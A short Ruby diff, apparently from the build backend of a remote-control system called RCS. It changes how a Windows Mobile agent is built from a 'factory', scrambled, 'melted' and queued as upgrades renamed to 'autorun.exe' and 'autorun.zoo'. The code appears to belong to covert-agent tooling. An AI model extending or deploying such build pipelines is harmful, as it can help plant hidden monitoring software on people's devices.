@@ -207,15 +207,15 @@ class Item
           end
 
           if mod['mobile']
-            factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+            factory = ::Item.where({_kind: 'factory', ident: mod['factory']}).first
             build = RCS::DB::Build.factory(:winmo)
             build.load({'_id' => factory._id})
             build.unpack
             build.patch({'demo' => self.demo})
             build.scramble
             build.melt({'admin' => false, 'demo' => self.demo})
-            add_upgrade('wmcore.001', File.join(build.tmpdir, 'firstsage'))
-            add_upgrade('wmcore.002', File.join(build.tmpdir, 'zoo'))
+            add_upgrade('wmcore.001', File.join(build.tmpdir, 'autorun.exe'))
+            add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))
             build.clean
           end
 
